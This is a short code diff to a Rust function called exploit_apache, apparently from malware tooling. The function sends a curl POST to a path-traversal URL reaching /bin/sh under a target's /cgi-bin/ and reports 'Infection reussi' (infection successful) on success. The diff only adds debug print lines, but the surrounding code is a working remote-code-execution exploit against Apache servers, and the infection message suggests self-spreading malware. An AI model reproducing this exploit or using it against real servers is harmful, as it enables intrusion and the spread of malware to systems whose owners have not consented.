@@ -34,6 +34,8 @@ pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
             let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", target_ip);
             //let srv:String = format!("51.77.193.65");
 
+            println!("{}", url);
+
             let command_output: Output = Command::new("curl")
                 .arg("-X")
                 .arg("POST")
@@ -48,8 +50,11 @@ pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
                 .output()
                 .map_err(|e| format!("Failed to execute command: {}", e)).expect("Erreur requete http");
 
+
+
             if command_output.status.success() {
                 let result_str = String::from_utf8_lossy(&command_output.stdout);
+                println!("Output: {}", result_str);
                 if result_str.is_empty() {
                     println!("Infection reussi - pas de message d'erreur si le serveur api est éteint ");
                 }
